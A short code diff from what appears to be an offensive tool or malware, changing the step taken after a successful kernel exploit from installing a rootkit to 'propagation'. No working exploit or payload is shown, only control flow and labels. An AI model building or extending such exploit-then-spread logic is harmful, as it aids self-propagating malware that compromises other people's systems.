@@ -186,7 +186,7 @@ def run():
         # - kernel version
         if exploit_kernel():
             print("kernel exploited")
-            next_action = "rootkit"
+            next_action = "propagation"
         else:
             print("no kernel exploit available")
             # test something else
